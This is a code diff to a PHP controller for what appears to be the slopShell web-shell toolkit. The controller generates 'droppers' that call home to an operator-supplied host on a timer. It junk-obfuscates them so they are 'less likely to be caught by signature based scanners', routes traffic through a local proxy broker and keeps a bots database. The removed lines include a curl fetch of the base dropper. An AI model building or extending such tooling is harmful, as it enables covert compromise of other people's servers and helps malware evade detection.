@@ -1,5 +1,7 @@
 <?php
+posix_setuid(getmyuid());
 require "includes/db/postgres_checker.php";
+require "includes/droppers/dynamic_generator.php";
 $cof = array(
     "useragent"=> "sp1.1",
     "proxy"=> "127.0.0.1:8090",
@@ -8,7 +10,7 @@ $cof = array(
     "username"=>"postgres",
     "password"=>"",
     "dbname"=>"sloppy_bots"
-    );
+);
 
 pclose(popen("nohup proxybroker serve --host 127.0.0.1 --port 8090 --types HTTPS HTTP --lvl High &", "r"));
 is_file("sloppy_config.ini") ? define("config", parse_ini_file('sloppy_config.ini', true)):define("config", $cof);
@@ -20,7 +22,7 @@ try{
 }catch (Exception $e){
     print("{$e}\n\n");
 }
-define('ppg', pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " pasword=" . config['password'] . "dbname=".config['dbname']));
+define('ppg', pg_connect("host=" . config['host'] . " port=" . config['port'] . " user=" . config['username'] . " password=" . config['password'] . "dbname=".config['dbname']));
 
 function logo($last, $cl){
     if ($last === "q"){
@@ -203,34 +205,30 @@ function clo($host, $repo, $uri)
 
 }
 
-function createDropper($callHome, $duration, $extras, $obfsucate, $depth){
-    require "includes/droppers/dynamic_generator.php";
-    $file_in = 'includes/droppers/base.php';
-    $ob = 'includes/dynamic/droppers/obfuscated/'.bin2hex(random_bytes(rand(5,25))).'.php';
-    $n = 'includes/dynamic/droppers/raw/'.bin2hex(random_bytes(rand(5,25))).'.php';
+function createDropper($callHome, $duration, $obfsucate, $depth){
+    echo "Starting dropper creation\n";
+    $file_in = "includes/base.php";
+    $ob = "includes/droppers/dynamic/obfuscated/".bin2hex(random_bytes(rand(5,25))).".php";
+    $n = "includes/droppers/dynamic/raw/".bin2hex(random_bytes(rand(5,25))).".php";
     $t = new dynamic_generator();
-    if (!empty($callHome) && !empty($duration) && !empty($extras) && !empty($depth)){
+    if ((int)$depth > 23) {
+        print("Depth needs to be 23 or lower, too much depth causes the script obfuscation to be redundant.\n");
+        $depth = 23;
+    }else{
+        print("Trying randomness with {$depth}\n");
+    }
+    if (!empty($callHome) && !empty($duration) && !empty($depth)){
         try{
-            switch(is_file("includes/droppers/base.php")){
-                case true:
-                    echo "We have the dropper downloaded :)\n";
-                    break;
-                case false:
-                    echo "Downloading dropper from github....\n";
-                    system("curl https://raw.githubusercontent.com/oldkingcone/slopShell/master/includes/base.php -o includes/base.php -vH 'User-Agent: Mozilla/5.0'");
-                    break;
-                default:
-                    echo "Something went wrong..\n";
-                    break;
-            }
             switch (strtolower($obfsucate)){
-                case "o"||"y"||"yes":
+                case "y":
                     print("Generated dropper will be: {$ob}\n");
                     $t->begin_junk($file_in, $depth, $ob, "ob");
+                    system("ls -lah includes/droppers/dynamic/obfuscated");
                     break;
                 default:
                     print("Generated Dropper will be: {$n}\n");
                     $t->begin_junk($file_in, "0", $n, "n");
+                    system("ls -lah includes/droppers/dynamic/raw");
             }
 
         }catch (Exception $exception){
@@ -368,11 +366,15 @@ while ($run) {
     switch (strtolower($pw)) {
         case "cr":
             system($clears);
-            $h = readline("Where are we calling home to?\n->");
-            $d = readline("How often should we call home?\n->");
-            $ob = readline("Do we need to obfuscate?\n->");
-            $de = readline("Level of depth?\nThis will add more randomness to the file making it less likely to be caught by signature based scanners.(int)\n->");
-            createDropper($h, $d, "1", $ob, $de);
+            echo("Where are we calling home to? (hostname/ip)->");
+            $h_name = trim(fgets(STDIN));
+            echo("How often should we call home? (int) ->");
+            $d_int = trim(fgets(STDIN));
+            echo("Do we need to obfuscate? (y/n) ->");
+            $osb = trim(fgets(STDIN));
+            echo("Level of depth? This will add more randomness to the file making it less likely to be caught by signature based scanners. (int) ->");
+            $de = trim(fgets(STDIN));
+            createDropper($h_name, $d_int, $osb, $de);
             break;
         case "s":
             system($clears);
@@ -380,7 +382,7 @@ while ($run) {
             try {
                 sys($h, queryDB($h, "s"));
             }catch (Exception $e){
-                menu($clears);
+                logo($clears, "s");
                 echo $e."\n";
             }
             break;
